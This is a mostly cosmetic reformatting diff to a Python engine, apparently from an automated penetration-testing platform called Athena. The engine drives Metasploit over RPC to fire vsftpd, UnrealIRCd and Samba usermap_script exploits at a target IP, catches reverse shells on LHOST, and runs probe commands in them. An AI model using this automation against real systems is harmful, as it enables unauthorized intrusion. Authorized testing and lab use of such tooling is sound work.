@@ -19,6 +19,7 @@ Supported:
   T1190 Samba usermap_script    -> exploit/multi/samba/usermap_script
   T1021.001 WinRM               -> auxiliary/scanner/winrm/winrm_login
 """
+
 import asyncio
 import logging
 import time
@@ -80,16 +81,14 @@ class MetasploitRPCEngine:
 
         while time.monotonic() < deadline:
             await asyncio.sleep(interval)
-            chunk = await asyncio.get_running_loop().run_in_executor(
-                None, shell.read
-            )
+            chunk = await asyncio.get_running_loop().run_in_executor(None, shell.read)
             if chunk:
                 accumulated += chunk
                 has_output = True
                 consecutive_empty = 0
                 interval = start_interval
                 stripped = accumulated.rstrip()
-                if stripped and stripped[-1] in ('$', '#', '>'):
+                if stripped and stripped[-1] in ("$", "#", ">"):
                     logger.debug("Prompt detected, output complete (%d chars)", len(accumulated))
                     break
             else:
@@ -111,9 +110,7 @@ class MetasploitRPCEngine:
     ) -> bool:
         """Verify session is alive before executing commands."""
         try:
-            sessions = await asyncio.get_running_loop().run_in_executor(
-                None, lambda: client.sessions.list
-            )
+            sessions = await asyncio.get_running_loop().run_in_executor(None, lambda: client.sessions.list)
         except Exception:
             logger.warning("Failed to query Metasploit sessions list")
             return False
@@ -184,9 +181,7 @@ class MetasploitRPCEngine:
                 "Set LHOST to the Athena host's reachable IP."
             )
         try:
-            client = await asyncio.get_running_loop().run_in_executor(
-                None, self._connect
-            )
+            client = await asyncio.get_running_loop().run_in_executor(None, self._connect)
 
             # SPEC-053: one-shot mode — do NOT reuse existing sessions.
             # Old implementation walked client.sessions.list looking for a
@@ -195,9 +190,7 @@ class MetasploitRPCEngine:
             # returned with broken I/O. Every call now launches fresh.
             pre_sessions: set = set(client.sessions.list.keys())
 
-            module_type = (
-                "exploit" if module_path.startswith("exploit") else "auxiliary"
-            )
+            module_type = "exploit" if module_path.startswith("exploit") else "auxiliary"
             exploit = client.modules.use(module_type, module_path)
 
             # Set exploit-level options (RHOSTS, etc.) via the module
@@ -225,9 +218,7 @@ class MetasploitRPCEngine:
             for _ in range(timeout_sec):
                 await asyncio.sleep(1)
                 sessions = client.sessions.list
-                new_sessions = {
-                    k: v for k, v in sessions.items() if k not in pre_sessions
-                }
+                new_sessions = {k: v for k, v in sessions.items() if k not in pre_sessions}
                 if new_sessions:
                     sid = list(new_sessions.keys())[0]
                     break
@@ -250,9 +241,7 @@ class MetasploitRPCEngine:
                 # returns empty even though the shell is alive.
                 await asyncio.sleep(2)
                 # Drain any banner or stale output from the shell
-                await asyncio.get_running_loop().run_in_executor(
-                    None, shell.read
-                )
+                await asyncio.get_running_loop().run_in_executor(None, shell.read)
                 # Reverse shell sessions through a relay tunnel have
                 # higher I/O latency than bind shells. The msfrpcd
                 # session buffer often doesn't flush until a second
@@ -263,33 +252,30 @@ class MetasploitRPCEngine:
                 shell.write("echo ATHENA_PROBE_START\n")
                 await asyncio.sleep(3)
                 # Drain the echo response (may or may not have arrived)
-                await asyncio.get_running_loop().run_in_executor(
-                    None, shell.read
-                )
+                await asyncio.get_running_loop().run_in_executor(None, shell.read)
                 shell.write(probe_cmd + "\n")
                 # Poll for probe output with increasing intervals
                 for _wait in (3, 3, 5):
                     await asyncio.sleep(_wait)
-                    output = await asyncio.get_running_loop().run_in_executor(
-                        None, shell.read
-                    )
+                    output = await asyncio.get_running_loop().run_in_executor(None, shell.read)
                     if output:
                         break
             finally:
                 if shell is not None:
                     try:
-                        await asyncio.get_running_loop().run_in_executor(
-                            None, shell.stop
-                        )
+                        await asyncio.get_running_loop().run_in_executor(None, shell.stop)
                         logger.info(
                             "Released session %s after one-shot exploit %s",
-                            sid, module_path,
+                            sid,
+                            module_path,
                         )
                     except Exception as release_exc:
                         # Release failure is not fatal — log and continue.
                         logger.warning(
                             "Failed to release session %s after %s: %s",
-                            sid, module_path, release_exc,
+                            sid,
+                            module_path,
+                            release_exc,
                         )
 
             return {
@@ -330,7 +316,9 @@ class MetasploitRPCEngine:
         """
         module, payload = _EXPLOIT_MAP["vsftpd"]
         return await self._run_exploit(
-            module, payload, {"RHOSTS": target_ip},
+            module,
+            payload,
+            {"RHOSTS": target_ip},
             probe_cmd=probe_cmd,
         )
 
@@ -350,7 +338,8 @@ class MetasploitRPCEngine:
         module, payload = _EXPLOIT_MAP["unrealircd"]
         effective_lhost = self._resolve_lhost(lhost)
         return await self._run_exploit(
-            module, payload,
+            module,
+            payload,
             {"RHOSTS": target_ip, "LHOST": effective_lhost},
             probe_cmd=probe_cmd,
         )
@@ -370,7 +359,8 @@ class MetasploitRPCEngine:
         module, payload = _EXPLOIT_MAP["samba"]
         effective_lhost = self._resolve_lhost(lhost)
         return await self._run_exploit(
-            module, payload,
+            module,
+            payload,
             {"RHOSTS": target_ip, "LHOST": effective_lhost},
             probe_cmd=probe_cmd,
         )
@@ -438,6 +428,7 @@ class MetasploitEngineAdapter(BaseEngineClient):
 
     async def is_available(self) -> bool:
         from app.config import settings
+
         return settings.MOCK_METASPLOIT or bool(settings.MSF_RPC_PASSWORD)
 
     async def list_abilities(self) -> list[dict]:
